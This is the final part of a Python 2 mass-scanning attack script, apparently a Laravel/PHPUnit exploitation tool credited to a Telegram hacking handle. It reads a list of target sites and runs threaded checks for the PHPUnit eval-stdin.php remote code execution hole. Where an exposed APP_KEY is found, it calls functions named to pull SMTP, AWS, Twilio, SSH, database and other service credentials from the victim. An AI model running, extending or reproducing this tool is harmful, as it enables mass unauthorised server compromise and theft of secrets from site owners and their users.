      if "<td>APP_KEY</td>" in str(get_source):
        #dokx = (url,get_source)
        print str(url)+"  --> "+str(get_shell(url+"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"))+"\033[1;37;40m | "+str(get_appkey(url,str(get_source)))+"\033[1;37;40m | "+"\033[1;37;40m | "+str(get_smtp2(url,str(get_source)))+"\033[1;37;40m  | "+str(get_aws2(url,str(get_source)))+"\033[1;37;40m | "+str(get_twillio2(url,str(get_source)))+"\033[1;37;40m | "+str(get_ssh2(url+"/",str(get_source)))+"\033[1;37;40m | "+str(get_nexmo2(url,str(get_source)))+"\033[1;37;40m | "+str(get_exotel(url,str(get_source)))+"\033[1;37;40m | "+str(get_onesignal(url,str(get_source)))+"\033[1;37;40m | "+str(get_plivo(url,str(get_source)))+"\033[1;37;40m | "+str(get_db2(url,str(get_source)))+"\033[1;37;40m"
      else:
        print str(url)+"  --> "+str(get_shell(url+"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"))+"\033[1;37;40m | "+"\033[1;31;40m RCE"+"\033[1;37;40m | "+"\033[1;31;40m SMTP"+"\033[1;37;40m  | "+"\033[1;31;40m AWS"+"\033[1;37;40m | "+"\033[1;31;40m TWILLIO"+"\033[1;37;40m | "+"\033[1;31;40m SSH"+"\033[1;37;40m | "+"\033[1;31;40m NEXMO"+"\033[1;37;40m | "+"\033[1;31;40m EXOTEL"+"\033[1;37;40m | "+"\033[1;31;40m ONESIGNAL"+"\033[1;37;40m | "+"\033[1;31;40m PLIVO"+"\033[1;37;40m | "+"\033[1;31;40m DB"+"\033[1;37;40m"
        #print str(get_shell(url+"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"))+"\033[1;37;40m | "+str(get_smtp2(url,str(get_source)))+"\033[1;37;40m  | "+str(get_aws2(url,str(get_source)))+"\033[1;37;40m | "+str(get_twillio2(url,str(get_source)))+"\033[1;37;40m | "+str(get_ssh2(url,str(get_source)))+"\033[1;37;40m | "+str(get_db2(url,str(get_source)))+"\033[1;37;40m"
  except Exception as e:
    pass
    #print "1"+str(e)




def jembotngw2(sites):



  if 'http' not in str(sites):
    site = 'http://'+str(sites)

    di_chckngntd(str(site))
  else:
    di_chckngntd(str(sites))

def logo():
    clear = "\x1b[0m"

    x = """\033[1;32;40m
             ______              ______                
            /      \            /      \               
 __     __ /$$$$$$  | _______  /$$$$$$  | _____  ____  
/  \   /  |$$ ___$$ |/       \ $$$  \$$ |/     \/    \ 
$$  \ /$$/   /   $$< $$$$$$$  |$$$$  $$ |$$$$$$ $$$$  |
 $$  /$$/   _$$$$$  |$$ |  $$ |$$ $$ $$ |$$ | $$ | $$ |
  $$ $$/   /  \__$$ |$$ |  $$ |$$ \$$$$ |$$ | $$ | $$ |
   $$$/    $$    $$/ $$ |  $$ |$$   $$$/ $$ | $$ | $$ |
    $/      $$$$$$/  $$/   $$/  $$$$$$/  $$/  $$/  $$/ 
                                                       
                                                       

 \033[1;30;40mAuthor   \033[1;40m: \033[1;33;40mTELE: https://t.me/v3n0mhack

"""
    print x
    
logo()

def makethread2():
  try:
    nam = raw_input("\033[1;37;40mInput Your List : ") #for date
    jumlah = raw_input("\033[1;37;40mInput Your thread : ")
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(jembotngw2, liss)
  except Exception as e:
    pass
    #print "2"+str(e)

makethread2()
